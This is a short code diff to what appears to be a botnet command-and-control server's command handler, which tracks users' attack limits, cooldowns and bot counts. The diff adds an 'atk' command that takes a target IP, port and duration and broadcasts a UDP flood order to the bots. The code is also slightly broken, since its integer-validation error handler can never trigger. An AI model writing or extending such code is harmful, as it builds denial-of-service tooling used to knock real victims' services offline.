@@ -286,12 +286,19 @@ def main_cmds(channel, username, addr):
                 #api = user.get('api_key', None)
                 channel.send(f"Username: {usernames}, Role ID: {rid}, UID: {uid}, ATK: {atk}, Cooldown: {cdt}, Expriy: {end}, Clients: {bot}\r\n")
 
-        elif command.startswith("start"):
-            url = command.split()
-            if len(url) < 2:
-                channel.send("Error: Missing URL for 'start' command \r\n")
+        elif command.startswith("atk"):
+            parts = command.split()
+            if len(parts) < 4:
+                channel.send("Error: Missing arguments for './UDP' command \r\n")
             else:
-                broadcast.message(f"start {url[1]}")                              
+                ip = parts[1]
+                try:
+                    port = parts[2]
+                    duration = parts[3]
+                    broadcast.message(f"UDP {ip} {port} {duration}")
+                except ValueError:
+                    channel.send("Error: Port and duration must be integers \r\n")
+                              
         elif command == 'clear' or command == 'cls':
             channel.send(cscreen)
 
